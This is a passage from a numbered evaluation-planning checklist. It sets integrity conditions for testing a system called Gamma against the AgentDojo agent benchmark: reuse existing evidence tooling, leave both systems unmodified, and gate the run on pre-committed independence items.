12. Reuse existing evidence infrastructure (ERTuple/Hydra Ledger/independent verifier/dashboard); **build no new report engine, author no new attack or task**. — resolves D-10, D-12, complexity.
13. Confirm **no modification to Gamma and no modification to AgentDojo**; integration is interposition-only at the sanctioned seam; adapter under a compatible license. — resolves D-11, governing invariant.
14. Obtain the **verbatim Reviewer 2 text** and re-map Part 7 against it. — certification of reviewer closure.

**Gate statement:** Items 1, 2, 3, 4, 5 are the anti-circularity / complete-mediation core. If any of the five is not satisfied and pre-committed, the AgentDojo evaluation is not scientifically independent and must not be run. The remaining items are correctness, honesty, and scope requirements that must be in place but do not, by themselves, threaten independence.
